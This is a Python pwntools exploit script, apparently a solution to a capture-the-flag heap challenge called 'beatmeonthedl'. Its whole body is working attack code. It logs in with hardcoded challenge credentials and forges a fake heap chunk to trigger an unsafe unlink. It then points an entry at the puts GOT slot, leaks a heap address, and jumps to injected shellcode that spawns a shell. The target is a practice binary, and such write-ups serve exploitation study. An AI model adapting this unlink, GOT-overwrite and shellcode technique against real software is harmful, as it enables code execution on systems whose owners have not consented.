#!/usr/bin/python
from pwn import *

context.arch = 'amd64'

p = process('./beatmeonthedl')
elf = ELF('./beatmeonthedl')

def login():
  p.recvuntil('username: ')
  p.sendline('mcfly')
  p.recvuntil('Pass: ')
  p.sendline('awesnap')

def req(content):
  p.recvuntil('| ')
  p.sendline('1')
  p.recvuntil('text > ')
  p.send(content)

def show():
  p.recvuntil('| ')
  p.sendline('2')

def delete(idx):
  p.recvuntil('| ')
  p.sendline('3')
  p.recvuntil('choice: ')
  p.sendline(str(idx))

def change(idx, content):
  p.recvuntil('| ')
  p.sendline('4')
  p.recvuntil('choice: ')
  p.sendline(str(idx))
  p.recvuntil('data: ')
  p.send(content)

sc = asm(shellcraft.amd64.linux.sh())

login()

req('a'*56)
req('b'*56)
req(sc)

target = 0x609e80
fake = p64(0) + p64(0x30) + p64(target - 24) + p64(target - 16) + 'A'*16 + p64(0x30) + p64(0x42)
change(0, fake)
delete(1)

payload = 'A'*24 + p64(elf.got['puts']) + p64(target+16)
change(0, payload)
show()
p.recvuntil('1) ')
heap = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0xb0

change(0, p64(heap + 0xb0))

p.interactive()

